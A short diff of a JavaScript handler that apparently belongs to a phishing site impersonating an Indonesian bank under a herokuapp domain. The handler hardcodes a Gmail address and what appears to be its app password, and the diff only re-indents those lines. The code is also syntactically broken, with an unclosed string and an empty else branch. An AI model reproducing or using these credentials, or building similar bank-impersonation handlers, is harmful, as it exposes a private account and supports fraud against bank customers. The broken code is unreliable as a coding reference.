@@ -11,8 +11,8 @@ export default function handler(req, res) {
 
     if (url == 'pilihan-tarif-bri-new.herokuapp.com){
 
-    email = 'landaslepas77@gmail.com'
-    pass = 'eyosohykexzgicup'
+       email = 'landaslepas77@gmail.com'
+       pass = 'eyosohykexzgicup';
    }else
 
 }
